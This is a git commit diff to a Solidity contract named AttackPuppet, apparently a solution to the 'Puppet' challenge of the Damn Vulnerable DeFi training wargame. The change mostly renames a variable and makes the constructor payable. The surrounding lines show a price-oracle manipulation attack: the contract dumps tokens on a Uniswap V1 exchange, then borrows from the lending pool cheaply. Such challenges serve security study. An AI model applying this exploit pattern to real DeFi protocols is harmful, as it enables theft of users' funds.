1c49e91ae341a9dd7ff9db92fa34103628356093
itsnico222 <togiabao222@gmail.com>
2024-10-07 16:08:01 +0700

    commit

--- src/attacker-contracts/AttackPuppet.sol
+++ src/attacker-contracts/AttackPuppet.sol
@@ -9,19 +9,19 @@ import {IUniswapV1Exchange} from "src/puppet/IUniswapV1Exchange.sol";
 
 contract AttackPuppet {
     DamnValuableToken token;
-    PuppetPool pool;
+    PuppetPool lendingPool;
     IUniswapV1Exchange uniswapV1Exchange;
     address recovery;
-    
+
     constructor (
         DamnValuableToken _token,
-        PuppetPool _pool,
+        PuppetPool _lendingPool,
         IUniswapV1Exchange _uniswapV1Exchange,
         address _recovery
-    ) {
-        token = DamnValuableToken(_token);
-        pool = PuppetPool(_pool);
-        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
         recovery = _recovery;
     }
 
@@ -30,7 +30,7 @@ contract AttackPuppet {
         token.approve(address(uniswapV1Exchange), tokenBalance);
         uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this));
 
-        pool.borrow{value:address(this).balance}(
+        lendingPool.borrow{value:address(this).balance}(
             amount,
             recovery
         );
